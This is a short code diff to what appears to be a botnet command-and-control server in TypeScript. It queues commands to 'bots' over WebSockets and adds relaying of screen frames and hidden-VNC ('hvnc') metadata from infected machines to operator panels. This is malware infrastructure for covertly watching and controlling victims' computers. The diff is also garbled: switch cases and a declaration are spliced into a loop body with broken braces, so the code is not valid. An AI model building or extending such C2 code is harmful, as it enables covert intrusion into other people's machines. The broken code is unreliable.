@@ -79,6 +79,36 @@ export function sendQueued(botId: string, cmdId: number): boolean {
 function flushQueue(botId: string, ws: WebSocket) {
   for (const c of dbApi.queued(botId)) {
     ws.send(JSON.stringify({ type: 'cmd', cmdId: c.id, cmd: c.cmd, args: c.args }));
-    dbApi.markSent(c.id);
+    
+    
+  dbApi.markSent(c.id);
+
+
+
+
+
+    const panels = new Map<string, WebSocket>();
+
+case 'panel': {
+  const botId = (msg as any).botId as string;
+  if (botId) panels.set(botId, ws);
+  break;
+}
+case 'frame': {
+  const botId = (msg as any).botId as string;
+  const panel = panels.get(botId);
+  if (panel && panel.readyState === WebSocket.OPEN) {
+    panel.send(JSON.stringify({ type: 'frame', botId, data: (msg as any).data }));
+  }
+  break;
+}
+case 'hvnc_meta': {
+  const botId = (msg as any).botId as string;
+  const panel = panels.get(botId);
+  if (panel && panel.readyState === WebSocket.OPEN) {
+    panel.send(JSON.stringify({ type: 'hvnc_meta', botId, w: (msg as any).w, h: (msg as any).h }));
+  }
+  break;
+  }
   }
     }
